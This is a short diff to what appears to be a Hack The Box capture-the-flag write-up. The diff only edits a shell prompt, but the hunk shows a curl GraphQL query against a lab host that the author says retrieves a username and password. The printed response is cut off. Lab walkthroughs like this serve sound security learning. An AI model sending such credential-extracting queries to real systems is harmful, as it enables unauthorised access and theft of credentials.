@@ -58,7 +58,7 @@ root@HassanKhan:~# curl "http://10.10.10.121:3000/" && echo -e "\n"
 I ran dirsearch and was able to find the endpoing query. After looking at the syntax of graphql that how it works, I was finally able to query the right syntax and was able to fetch credentials from that.
 
 ```console
-root@HassanKhan:~/oscp/hackthebox/swagshop# curl -s "http://10.10.10.121:3000/graphql?query=query%20%7B%20%0A%20%20user%7Busername:password%7D%0A%7D&variables=%7B%7D" | jq
+root@HassanKhan:~# curl -s "http://10.10.10.121:3000/graphql?query=query%20%7B%20%0A%20%20user%7Busername:password%7D%0A%7D&variables=%7B%7D" | jq
 {
   "data": {
     "user": {
